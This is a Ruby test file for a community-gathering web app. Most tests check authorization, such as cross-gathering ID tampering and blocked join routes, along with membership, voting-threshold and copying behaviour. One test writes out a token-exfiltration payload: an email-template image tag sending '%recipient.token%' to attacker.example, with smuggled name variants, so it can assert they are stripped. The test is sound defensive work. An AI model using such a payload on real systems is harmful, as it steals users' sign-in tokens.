require File.expand_path("#{File.dirname(__FILE__)}/test_config.rb")

class GatheringsTest < ActiveSupport::TestCase
  include Capybara::DSL
  include Rack::Test::Methods

  def create_member
    FactoryBot.create(:account).tap { |account| @gathering.memberships.create!(account: account) }
  end

  def create_two_gatherings
    create_gathering
    @other_account = FactoryBot.create(:account)
    @other_gathering = FactoryBot.create(:gathering, account: @other_account)
  end

  test 'creating a gathering' do
    account = FactoryBot.create(:account)
    gathering = FactoryBot.build_stubbed(:gathering)
    sign_in(account)
    click_link 'Gatherings'
    click_link 'All gatherings'
    within('#content') { click_link 'Create a gathering' }
    fill_in 'Name', with: gathering.name
    fill_in 'URL', with: gathering.slug
    click_link 'Next'
    click_link 'Next'
    click_link 'Next'
    click_link 'Next'
    click_button 'Create gathering'
    assert page.has_content? 'created the gathering'
  end

  test 'editing a gathering' do
    create_gathering
    sign_in(@account)
    visit "/g/#{@gathering.slug}/edit"
    fill_in 'Name', with: (name = FactoryBot.build_stubbed(:gathering).name)
    click_button 'Update gathering'
    assert page.has_content? 'The gathering was saved'
    assert page.has_content? name
  end

  test 'copying a gathering without another admin destination redirects safely' do
    create_gathering
    sign_in(@account)

    visit "/g/#{@gathering.slug}"
    assert page.has_no_link? 'Copy'

    visit "/g/#{@gathering.slug}/copy"
    assert page.has_content? 'You need to be an admin of another gathering to copy into it.'
    assert page.has_current_path?("/g/#{@gathering.slug}", ignore_query: true)
  end

  test 'team edit rejects gathering_id from params' do
    create_two_gatherings
    team = @gathering.teams.find_by(name: 'General')

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/teams/#{team.id}/edit", team: { name: team.name, gathering_id: @other_gathering.id }

    assert_equal @gathering.id, team.reload.gathering_id
  end

  test 'teamship create cannot attach a team from another gathering' do
    create_two_gatherings
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/teamships/new", teamship: { account_id: @account.id, team_id: other_team.id }

    refute other_team.teamships.find_by(account: @account)
  end

  test 'optionship create cannot attach an option from another gathering' do
    create_two_gatherings
    other_option = @other_gathering.options.create!(name: 'Cabin', type: 'Accommodation', account: @other_account)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/optionships/new", optionship: { account_id: @account.id, option_id: other_option.id }

    refute other_option.optionships.find_by(account: @account)
  end

  test 'members can join open options but are not offered those by invitation' do
    create_gathering
    member = create_member
    open_option = @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: @account)
    @gathering.options.create!(name: 'Cabin', type: 'Accommodation', account: @account, by_invitation: true)

    sign_in(member)
    visit "/g/#{@gathering.slug}/options"
    within(find('tr', text: 'Cabin')) do
      assert page.has_content? 'By invitation'
      assert page.has_no_link? 'Join'
    end
    within(find('tr', text: 'Tent')) { click_link 'Join' }
    assert page.has_link? 'Leave'
    assert open_option.optionships.find_by(account: member)
  end

  test 'members cannot join an option by invitation through its route' do
    create_gathering
    member = create_member
    invitation_option = @gathering.options.create!(name: 'Cabin', type: 'Accommodation', account: @account, by_invitation: true)

    sign_in_with_rack(member)
    post "/g/#{@gathering.slug}/optionships/create", option_id: invitation_option.id
    assert_equal 403, last_response.status
    refute invitation_option.optionships.find_by(account: member)
  end

  test 'verdict create rejects mapplication_id from params' do
    create_two_gatherings
    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    other_mapplication = @other_gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/mapplications/#{mapplication.id}/verdicts/create", verdict: { type: 'proposer', mapplication_id: other_mapplication.id }

    assert mapplication.verdicts.find_by(account: @account)
    refute other_mapplication.verdicts.find_by(account: @account)
  end

  test 'shift create cannot use a role from another rota' do
    create_two_gatherings
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    other_rota = @other_gathering.rotas.create!(name: 'Bar', account: @other_account)
    other_role = Role.create!(name: 'Barista', rota: other_rota)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/rotas/#{rota.id}/create_shift", shift: { account_id: @account.id, role_id: other_role.id, rslot_id: rslot.id }

    assert_equal 404, last_response.status
    refute Shift.find_by(role: other_role)
    refute Shift.find_by(rslot: rslot)
  end

  test 'self-service shift create scopes roles and slots to its rota' do
    create_two_gatherings
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    other_rota = @other_gathering.rotas.create!(name: 'Bar', account: @other_account)
    other_role = Role.create!(name: 'Barista', rota: other_rota)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/shifts/create", rota_id: rota.id, role_id: other_role.id, rslot_id: rslot.id

    assert_equal 404, last_response.status
    refute Shift.find_by(role: other_role)
    refute Shift.find_by(rslot: rslot)
  end

  test "a gathering's rota routes only find its own rotas, roles, slots and shifts" do
    create_two_gatherings
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    other_rota = @other_gathering.rotas.create!(name: 'Bar', account: @other_account)
    other_role = Role.create!(name: 'Barista', rota: other_rota)
    other_rslot = Rslot.create!(name: 'Evening', rota: other_rota)
    barista = FactoryBot.create(:account, name: 'Secret Barista')
    @other_gathering.memberships.create!(account: barista)
    other_shift = Shift.create!(account: barista, role: other_role, rslot: other_rslot, rota: other_rota)

    # An admin of one gathering, asking through it for another gathering's records
    sign_in_with_rack(@account)
    get "/g/#{@gathering.slug}/shifts/#{other_shift.id}/edit"
    assert_equal 404, last_response.status
    refute_includes last_response.body, 'Secret Barista'
    get "/g/#{@gathering.slug}/roles/#{other_role.id}/edit"
    assert_equal 404, last_response.status
    post "/g/#{@gathering.slug}/rslots/#{other_rslot.id}/destroy"
    assert_equal 404, last_response.status
    assert Rslot.find(other_rslot.id)
    post "/g/#{@gathering.slug}/roles/create", rota_id: other_rota.id, name: 'Intruder'
    assert_equal 404, last_response.status
    refute other_rota.roles.find_by(name: 'Intruder')
    # and through its own rota, its own
    post "/g/#{@gathering.slug}/roles/create", rota_id: rota.id, name: 'Cook'
    assert rota.roles.find_by(name: 'Cook')
  end

  test 'member cannot reassign their shift to another account' do
    create_gathering
    member = FactoryBot.create(:account)
    other_member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    @gathering.memberships.create!(account: other_member)
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    role = Role.create!(name: 'Cook', rota: rota)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    shift = Shift.create!(account: member, role: role, rslot: rslot, rota: rota)

    sign_in_with_rack(member)
    post "/g/#{@gathering.slug}/shifts/#{shift.id}/edit", shift: { account_id: other_member.id }

    assert_equal member.id, shift.reload.account_id
    assert_equal member.id, shift.membership.account_id
  end

  test 'members cannot create paid options or make free options paid' do
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    free_option = @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: member)

    sign_in_with_rack(member)
    post "/g/#{@gathering.slug}/options/new", option: { name: 'Cabin', type: 'Accommodation', cost: 100 }
    post "/g/#{@gathering.slug}/options/#{free_option.id}/edit", option: { name: 'Tent', cost: 100 }

    assert_equal 0, @gathering.options.find_by(name: 'Cabin').cost
    assert_equal 0, free_option.reload.cost
  end

  test 'admins can create paid options, and members are not offered a cost' do
    create_gathering
    member = create_member

    sign_in(@account)
    visit "/g/#{@gathering.slug}/options"
    click_link 'Add an option'
    within('#add-option') do
      fill_in 'Name', with: 'Cabin'
      fill_in 'Cost', with: '100'
      click_button 'Create option'
    end
    assert page.has_content? 'Cabin'
    assert_equal 100, @gathering.options.find_by(name: 'Cabin').cost

    sign_in(member)
    visit "/g/#{@gathering.slug}/options"
    click_link 'Add an option'
    within('#add-option') do
      assert page.has_content? 'Only admins can add paid options'
      assert page.has_field? 'Cost', disabled: true
    end
  end

  test 'admins edit an option in a modal from the options page' do
    create_gathering
    option = @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: @account)
    sign_in(@account)

    visit "/g/#{@gathering.slug}/options"
    click_link 'Tent'
    within '#modal' do
      assert page.has_field? 'Name', with: 'Tent'
      fill_in 'Name', with: 'Bell tent'
      click_button 'Update option'
    end
    assert page.has_content? 'Bell tent'
    assert page.has_current_path?("/g/#{@gathering.slug}/options", ignore_query: true)
    assert_equal 'Bell tent', option.reload.name
  end

  test 'inventory item cannot be assigned a team from another gathering' do
    create_two_gatherings
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)
    item = @gathering.inventory_items.build(name: 'Tent', team: other_team, account: @account)
    refute item.valid?
    assert_includes item.errors[:team], 'must belong to the same gathering'
  end

  test 'spend cannot be assigned a team from another gathering' do
    create_two_gatherings
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)
    spend = @gathering.spends.build(item: 'Food', amount: 10, team: other_team, account: @account)
    refute spend.valid?
    assert_includes spend.errors[:team], 'must belong to the same gathering'
  end

  test 'admin reassigning a spend updates its membership' do
    create_gathering
    member = FactoryBot.create(:account, name: 'Member Person')
    member_membership = @gathering.memberships.create!(account: member)
    team = @gathering.teams.find_by(name: 'General')
    spend = @gathering.spends.create!(item: 'Food', amount: 10, team: team, account: @account)

    sign_in(@account)
    visit "/g/#{@gathering.slug}/budget"
    click_link 'Food'
    select 'Member Person', from: 'Paid by'
    click_button 'Update spend'
    # Back on the budget, which shows who spent it
    assert page.has_link? 'Member Person'

    spend.reload
    assert_equal member.id, spend.account_id
    assert_equal member_membership.id, spend.membership_id
  end

  test 'members added by someone else do not follow existing members' do
    create_gathering
    admin = @account
    added = FactoryBot.create(:account)
    @gathering.memberships.create! account: added, added_by: admin
    assert Follow.find_by(follower: admin, followee: added)
    assert_nil Follow.find_by(follower: added, followee: admin)

    joiner = FactoryBot.create(:account)
    @gathering.memberships.create! account: joiner
    assert Follow.find_by(follower: joiner, followee: admin)
    assert Follow.find_by(follower: admin, followee: joiner)
    assert_nil Follow.find_by(follower: added, followee: joiner)
  end

  test 'applications submitted while signed out for an existing account do not make the account follow members' do
    create_gathering
    admin = @account
    @gathering.set(privacy: 'closed')
    victim = FactoryBot.create(:account)

    visit "/g/#{@gathering.slug}/apply"
    fill_in 'Full name', with: 'Anyone'
    fill_in 'Email', with: victim.email
    click_button 'Apply'
    assert page.has_current_path?("/g/#{@gathering.slug}/apply?applied=true")

    mapplication = @gathering.mapplications.find_by(account: victim)
    assert mapplication.submitted_signed_out
    mapplication.accept
    assert @gathering.memberships.find_by(account: victim).added_without_applying
    assert_nil Follow.find_by(follower: victim, followee: admin)
  end

  test 'members added by someone else after applying follow existing members' do
    create_gathering
    admin = @account
    applicant = FactoryBot.create(:account)
    @gathering.mapplications.create! account: applicant, status: 'pending'
    @gathering.memberships.create! account: applicant, added_by: admin
    assert Follow.find_by(follower: applicant, followee: admin)
    assert Follow.find_by(follower: admin, followee: applicant)
  end

  test 'members added by someone else still do not follow new members after the adder deletes their account' do
    create_gathering
    adder = FactoryBot.create(:account)
    @gathering.memberships.create! account: adder
    added = FactoryBot.create(:account)
    @gathering.memberships.create! account: added, added_by: adder
    adder.destroy
    assert_nil @gathering.memberships.find_by(account: added).added_by_id

    joiner = FactoryBot.create(:account)
    @gathering.memberships.create! account: joiner
    assert_nil Follow.find_by(follower: added, followee: joiner)
  end

  test 'gathering welcome email cannot exfiltrate a sign-in token via an image' do
    create_gathering
    @gathering.set(
      welcome_email: '<p>Hi</p><img src="https://attacker.example/%recipient.token%"><p>[gathering_name]</p><p>[sign_in_details]</p>'
    )
    @gathering.update!(name: 'Gathering %recipient.token%')
    assert_equal 'Gathering', @gathering.name
    @gathering.update!(name: 'Gathering %recipient.tok%recipient.token%en%')
    refute_includes @gathering.name, '%recipient.token%'
    @gathering.update!(name: 'Gathering &lt;img src="https://name.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;')
    refute_includes @gathering.name, '%recipient'
    @gathering.set(name: 'Gathering %%recipient.firstname%% [sign_in_details]')
    sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?link_token=%recipient.token%">Sign in</a>)
    html = @gathering.welcome_email_html(sign_in_details)

    assert_match(/<p[^>]*>Gathering /, html)
    assert_includes html, "Gathering %%\u200Crecipient.firstname%% [sign_in_details]"

    refute_match(%r{src="[^"]*%recipient\.token%}, html)
    refute_match(/<img[^>]*name\.example/, html)
    assert_includes html, "#{ENV['BASE_URI']}/g/#{@gathering.slug}?link_token=%recipient.token%"
    assert_equal html.scan('link_token=%recipient.token%').size, html.scan('%recipient.token%').size
  end

  test 'comment cannot attach a post from another commentable' do
    create_two_gatherings
    team = @gathering.teams.find_by(name: 'General')
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)
    other_post = other_team.posts.create!(subject: 'Private', account: @other_account)

    sign_in_with_rack(@account)
    post '/comment', comment: { commentable_type: 'Team', commentable_id: team.id, post_id: other_post.id, body: 'Hello' }

    assert_equal 404, last_response.status
    assert_equal 0, other_post.comments.count
  end

  test 'buying a ticket to an event adds the buyer to its gathering' do
    covers 'gatherings/ticket-buyers-join-gathering@9cd984'
    create_gathering
    create_event(prices: [10], gathering: @gathering)
    buyer = FactoryBot.create(:account)
    order = @event.orders.create!(account: buyer, currency: @event.currency, value: 10, payment_completed: false)
    order.tickets.create!(event: @event, account: buyer, ticket_type: @event.ticket_types.first, price: 10)
    refute @gathering.memberships.find_by(account: buyer)

    order.payment_completed!
    assert @gathering.memberships.find_by(account: buyer)
  end

  test 'anyone with the link can join an open gathering' do
    covers 'gatherings/video-access-modes@f478bb', 'gatherings/access-modes@d37537'
    create_gathering(privacy: 'open')
    joiner = FactoryBot.create(:account)
    sign_in(joiner)

    visit "/g/#{@gathering.slug}"
    assert page.has_current_path?("/g/#{@gathering.slug}/join", ignore_query: true)
    visit "/g/#{@gathering.slug}/apply"
    assert page.has_current_path?("/g/#{@gathering.slug}/join", ignore_query: true)

    click_button 'Join'
    assert page.has_link? 'Leave gathering'
    assert @gathering.memberships.find_by(account: joiner)
  end

  test 'people must apply to join a gathering that takes applications, answering its questions' do
    covers 'gatherings/video-access-modes@f478bb', 'gatherings/video-application-questions@b04aab', 'gatherings/access-modes@d37537', 'gatherings/application-questions@2b6bb5'
    create_gathering(privacy: 'closed', application_questions: "Why do you want to come?\nWhat will you bring?")
    applicant = FactoryBot.create(:account)
    sign_in(applicant)

    visit "/g/#{@gathering.slug}"
    assert page.has_current_path?("/g/#{@gathering.slug}/apply", ignore_query: true)
    assert page.has_content? 'Why do you want to come?'
    assert page.has_content? 'What will you bring?'
    find('textarea[name="answers[0]"]').fill_in(with: 'To learn')
    find('textarea[name="answers[1]"]').fill_in(with: 'Soup')
    click_button 'Apply'
    assert page.has_current_path?("/g/#{@gathering.slug}/apply?applied=true")

    mapplication = @gathering.mapplications.find_by(account: applicant)
    assert_equal 'pending', mapplication.status
    assert_equal [['Why do you want to come?', 'To learn'], ['What will you bring?', 'Soup']], mapplication.answers
    refute @gathering.memberships.find_by(account: applicant)
  end

  test 'people cannot join a gathering that takes applications through the join route' do
    covers 'gatherings/access-modes@d37537'
    create_gathering(privacy: 'closed')
    applicant = FactoryBot.create(:account)
    sign_in_with_rack(applicant)

    post "/g/#{@gathering.slug}/join"
    refute @gathering.memberships.find_by(account: applicant)
  end

  test 'nobody can join or apply to an invitation-only gathering through its routes' do
    covers 'gatherings/video-access-modes@f478bb', 'gatherings/access-modes@d37537'
    create_gathering(privacy: 'secret')
    outsider = FactoryBot.create(:account)
    sign_in_with_rack(outsider)

    # Being sent away from its pages is in gathering_rules_test.rb
    post "/g/#{@gathering.slug}/join"
    post "/g/#{@gathering.slug}/apply"
    assert_equal 403, last_response.status
    refute @gathering.memberships.find_by(account: outsider)
    refute @gathering.mapplications.find_by(account: outsider)
  end

  test 'all members can see and propose applicants' do
    covers 'gatherings/video-propose@686842', 'gatherings/members-see-and-vote@d114df'
    create_gathering(privacy: 'closed', fixed_threshold: 2)
    member = create_member
    applicant = FactoryBot.create(:account, name: 'Applicant Person')
    mapplication = @gathering.mapplications.create!(account: applicant, status: 'pending')

    sign_in(member)
    visit "/g/#{@gathering.slug}/applications"
    assert page.has_content? 'Applicant Person'
    click_link 'Propose'
    click_button 'Submit'
    assert page.has_link? 'Unpropose'
    assert mapplication.verdicts.proposers.find_by(account: member)
  end

  test 'non-members cannot see or vote on applications' do
    covers 'gatherings/members-see-and-vote@d114df'
    create_gathering(privacy: 'closed', fixed_threshold: 2)
    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    outsider = FactoryBot.create(:account)

    sign_in_with_rack(outsider)
    get "/g/#{@gathering.slug}/applications"
    assert last_response.redirect?
    post "/g/#{@gathering.slug}/mapplications/#{mapplication.id}/verdicts/create", verdict: { type: 'proposer' }
    refute mapplication.verdicts.find_by(account: outsider)
  end

  test 'applications can have proposers only, or proposers and supporters' do
    covers 'gatherings/video-propose@686842', 'gatherings/vote-types@ccfd7a'
    create_gathering(privacy: 'closed', fixed_threshold: 2)
    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account, name: 'Applicant Person'), status: 'pending')
    sign_in(@account)

    visit "/g/#{@gathering.slug}/applications"
    assert page.has_content? 'Applicant Person'
    assert page.has_link? 'Propose'
    assert page.has_no_link? 'Support'
    mapplication.verdicts.create!(account: @account, type: 'proposer')
    mapplication.verdicts.create!(account: create_member, type: 'supporter')
    refute mapplication.meets_threshold

    @gathering.update!(enable_supporters: true)
    sign_in(create_member)
    visit "/g/#{@gathering.slug}/applications"
    assert page.has_link? 'Support'
    assert mapplication.reload.meets_threshold
  end

  test "an application opened in the modal doesn't focus its discussion form" do
    create_gathering(privacy: 'closed')
    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    sign_in(@account)
    visit "/g/#{@gathering.slug}/applications"
    find("a[onclick*='mapplications/#{mapplication.id}']").click
    within('#modal') { assert page.has_field? 'Subject' }
    # Bootstrap focuses the modal once it's shown, just before shown.bs.modal, which used to move it to Subject
    assert page.has_css?('#modal:focus')
  end

  test 'an edit form opened in the modal starts at its first field' do
    create_gathering(privacy: 'open')
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    Rslot.create!(name: 'Morning', rota: rota)
    sign_in(@account)
    visit "/g/#{@gathering.slug}/rotas/#{rota.id}"
    click_link 'Morning'
    within('#modal') { assert page.has_css?('input[name="rslot[name]"]:focus') }
  end

  test 'an application is accepted at the magic number of proposers plus supporters, with at least one proposer' do
    covers 'gatherings/video-magic-number@7fc314', 'gatherings/magic-number@66775d', 'gatherings/median-magic-number@bbe05c'
    create_gathering(privacy: 'closed', fixed_threshold: 2, enable_supporters: true)
    supporters_only = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    supporters_only.verdicts.create!(account: @account, type: 'supporter')
    supporters_only.verdicts.create!(account: create_member, type: 'supporter')
    assert_equal 'pending', supporters_only.reload.status

    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    mapplication.verdicts.create!(account: @account, type: 'proposer')
    assert_equal 'pending', mapplication.reload.status
    mapplication.verdicts.create!(account: create_member, type: 'supporter')
    assert_equal 'accepted', mapplication.reload.status
    assert @gathering.memberships.find_by(account: mapplication.account)
  end

  test 'the magic number can be the median of the numbers members suggest' do
    covers 'gatherings/median-magic-number@bbe05c'
    create_gathering(privacy: 'closed', fixed_threshold: 5, democratic_threshold: true)
    assert_nil @gathering.fixed_threshold
    members = Array.new(2) { FactoryBot.create(:account) }
    members.each { |member| @gathering.memberships.create!(account: member) }

    # Each suggestion moves the median: 4, then of 4 and 1, 3, then of 4, 1 and 2, 2
    [[members[1], 4, 4], [@account, 1, 3], [members[0], 2, 2]].each do |account, number, median|
      sign_in(account)
      visit "/g/#{@gathering.slug}/applications"
      find_field('desired_threshold').fill_in(with: number).send_keys(:tab)
      assert page.has_content? "Automatically accepting applications with #{median}"
    end
    assert_equal 2, @gathering.reload.threshold

    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    mapplication.verdicts.create!(account: @account, type: 'proposer')
    assert_equal 'pending', mapplication.reload.status
    mapplication.verdicts.create!(account: members[0], type: 'proposer')
    assert_equal 'accepted', mapplication.reload.status
  end

  test 'joining a tier requests its cost, until the tier is full' do
    covers 'gatherings/video-join-tier-payment@1d3412'
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    @gathering.options.create!(name: 'Standard', type: 'Tier', capacity: 1, cost: 100, account: @account)

    sign_in(member)
    visit "/g/#{@gathering.slug}/options"
    click_link 'Join'
    assert page.has_content? 'You owe £100'
    assert_equal 100, @gathering.memberships.find_by(account: member).requested_contribution
    assert @gathering.memberships.find_by(account: member).owes_contribution?

    sign_in(@account)
    visit "/g/#{@gathering.slug}/options"
    within(find('tr', text: 'Standard')) do
      assert page.has_content? 'Full'
      assert page.has_no_link? 'Join'
    end
  end

  test 'leaving a tier stops requesting its cost' do
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    @gathering.options.create!(name: 'Standard', type: 'Tier', cost: 100, account: @account)

    sign_in(member)
    visit "/g/#{@gathering.slug}/options"
    click_link 'Join'
    assert page.has_content? 'You owe £100'
    click_link 'Leave'
    page.document.find('.popover').click_button 'Leave'
    assert page.has_link? 'Join'
    assert page.has_no_content? 'You owe'
    assert_equal 0, @gathering.memberships.find_by(account: member).requested_contribution
  end

  test 'a full tier takes no one else through its route' do
    create_gathering
    tier = @gathering.options.create!(name: 'Standard', type: 'Tier', capacity: 1, cost: 100, account: @account)
    tier.optionships.create!(account: create_member, gathering: @gathering)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/optionships/create", option_id: tier.id
    refute tier.optionships.find_by(account: @account)
  end

  test 'the members table and the timetable render their rows with the page' do
    create_gathering
    member = FactoryBot.create(:account, name: 'Member Person')
    @gathering.memberships.create!(account: member, added_by: @account)
    event = FactoryBot.create(:event, gathering: @gathering, last_saved_by: @account, name: 'Opening night')
    Ticket.create!(event: event, account: member, ticket_type: FactoryBot.create(:ticket_type, event: event, name: 'Early bird'), payment_completed: true)
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    Shift.create!(account: member, role: Role.create!(name: 'Cook', rota: rota), rslot: Rslot.create!(name: 'Morning', rota: rota), rota: rota)
    timetable = @gathering.timetables.create!(name: 'Workshops', account: @account)
    tactivity = timetable.tactivities.create!(name: 'Yoga', account: member)
    tactivity.attendances.create!(account: member)

    sign_in_with_rack(@account)
    get "/g/#{@gathering.slug}/members"
    assert last_response.ok?
    row = last_response.body[/<tr data-pagelet-url="\/g\/#{@gathering.slug}\/membership_row\/#{@gathering.memberships.find_by(account: member).id}">.*?<\/tr>/m]
    assert_includes row, 'Member Person'
    assert_includes row, 'Early bird, Opening night'
    assert_includes row, 'Kitchen: Cook, Morning'
    assert_includes row, ERB::Util.h(@account.name) # proposed by
    get "/g/#{@gathering.slug}/membership_row/#{@gathering.memberships.find_by(account: member).id}"
    assert_includes last_response.body, 'Early bird, Opening night'

    get "/g/#{@gathering.slug}/timetables/#{timetable.id}"
    assert_includes last_response.body, '1 person interested'

    get "/g/#{@gathering.slug}/members.csv"
    member_row = CSV.parse(last_response.body, headers: true).find { |csv_row| csv_row['name'] == 'Member Person' }
    assert_equal @account.name, member_row['proposed_by']
  end

  test 'each of the six features can be enabled or disabled' do
    covers 'gatherings/optional-features@9dfad8'
    features = { contributions: 'options', teams: 'teams', timetables: 'timetables/new', rotas: 'rotas/new', inventory: 'inventory', budget: 'budget' }
    create_gathering
    sign_in_with_rack(@account)

    get "/g/#{@gathering.slug}"
    features.each_value { |path| assert_includes last_response.body, %(href="/g/#{@gathering.slug}/#{path}") }

    @gathering.update!(features.keys.to_h { |feature| [:"enable_#{feature}", false] })
    get "/g/#{@gathering.slug}"
    assert last_response.ok?
    features.each_value { |path| refute_includes last_response.body, %(href="/g/#{@gathering.slug}/#{path}") }
  end

  test 'copying a gathering copies its timetables, rotas and options but not its members, payments, activities or shifts' do
    covers 'gatherings/copy-timetables@ed0f5d', 'gatherings/copy-rotas@c68086', 'gatherings/copy-options@a1c0af', 'gatherings/copy-not-members@0f6c02'
    create_two_gatherings
    @other_gathering.memberships.create!(account: @account, admin: true)
    member = FactoryBot.create(:account)
    membership = @gathering.memberships.create!(account: member)
    timetable = @gathering.timetables.create!(name: 'Workshops', account: @account)
    tslot = timetable.tslots.create!(name: '10am')
    space = timetable.spaces.create!(name: 'Dome')
    timetable.tactivities.create!(name: 'Yoga', account: member, tslot: tslot, space: space)
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    role = Role.create!(name: 'Cook', rota: rota, worth: 2)
    rslot = Rslot.create!(name: 'Morning', rota: rota, worth: 3)
    Shift.create!(account: member, role: role, rslot: rslot, rota: rota)
    option = @gathering.options.create!(name: 'Cabin', description: 'Cosy', type: 'Accommodation', capacity: 4, cost: 50, split_cost: true, account: @account)
    option.optionships.create!(account: member, gathering: @gathering)
    Payment.create!(membership: membership, amount: 50, currency: 'GBP')

    sign_in(@account)
    visit "/g/#{@gathering.slug}"
    click_link 'Copy'
    find('select[name=gathering_id]').select @other_gathering.name
    click_button 'Copy'
    # Taken to the gathering copied into
    assert page.has_current_path?("/g/#{@other_gathering.slug}", ignore_query: true)
    @other_gathering.reload

    new_timetable = @other_gathering.timetables.find_by(name: 'Workshops')
    assert_equal ['10am'], new_timetable.tslots.pluck(:name)
    assert_equal ['Dome'], new_timetable.spaces.pluck(:name)
    new_rota = @other_gathering.rotas.find_by(name: 'Kitchen')
    assert_equal [['Cook', 2.0]], new_rota.roles.pluck(:name, :worth)
    assert_equal [['Morning', 3.0]], new_rota.rslots.pluck(:name, :worth)
    new_option = @other_gathering.options.find_by(name: 'Cabin')
    assert_equal ['Cosy', 'Accommodation', 4, 50, true], [new_option.description, new_option.type, new_option.capacity, new_option.cost, new_option.split_cost]

    refute @other_gathering.memberships.find_by(account: member)
    assert_equal 0, @other_gathering.payments.count
    assert_equal 0, @other_gathering.tactivities.count
    assert_equal 0, @other_gathering.shifts.count
    assert_equal 0, @other_gathering.optionships.count
  end

  test 'site admins can browse and administer every gathering without being a member, but not act as a member' do
    create_gathering(privacy: 'secret', listed: false)
    team = @gathering.teams.create!(name: 'Kitchen', account: @account)
    rota = @gathering.rotas.create!(name: 'Bar', account: @account)
    @gathering.rotas.create!(name: 'Door', account: @account) # with one rota, the rotas overview redirects to it
    timetable = @gathering.timetables.create!(name: 'Workshops', account: @account)
    member = FactoryBot.create(:account, name: 'Member Person')
    @gathering.memberships.create!(account: member)
    @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: @account).optionships.create!(account: member, gathering: @gathering)
    shift = Shift.create!(account: member, role: Role.create!(name: 'Cook', rota: rota), rslot: Rslot.create!(name: 'Morning', rota: rota), rota: rota)
    site_admin = FactoryBot.create(:account, admin: true)
    outsider = FactoryBot.create(:account)

    sign_in_with_rack(outsider)
    get '/gatherings'
    assert_not_includes last_response.body, @gathering.name
    get "/g/#{@gathering.slug}/members"
    assert last_response.redirect?

    sign_in_with_rack(site_admin)
    get '/gatherings'
    assert_includes last_response.body, @gathering.name
    [
      '', '/todos', '/members', '/applications', '/applications/paused', '/threshold', '/options', '/teams', "/teams/#{team.id}",
      '/rotas', "/rotas/#{rota.id}", '/timetables', "/timetables/#{timetable.id}", '/inventory', '/budget', '/payments', '/edit'
    ].each do |path|
      get "/g/#{@gathering.slug}#{path}"
      assert last_response.ok?, "GET /g/#{@gathering.slug}#{path} returned #{last_response.status}"
    end

    get "/g/#{@gathering.slug}/options"
    assert_includes last_response.body, 'Member Person'

    get "/g/#{@gathering.slug}/shifts/#{shift.id}/edit"
    assert last_response.ok?
    post "/g/#{@gathering.slug}/shifts/#{shift.id}/destroy"
    refute Shift.find(shift.id)

    post "/g/#{@gathering.slug}/rotas/#{rota.id}/destroy"
    refute @gathering.rotas.find(rota.id)

    post "/g/#{@gathering.slug}/teams/new", team: { name: 'Garden' }
    assert last_response.redirect?
    refute @gathering.teams.find_by(name: 'Garden')
    get "/g/#{@gathering.slug}/unsubscribe"
    assert last_response.redirect?
    refute @gathering.memberships.find_by(account: site_admin)
  end
end
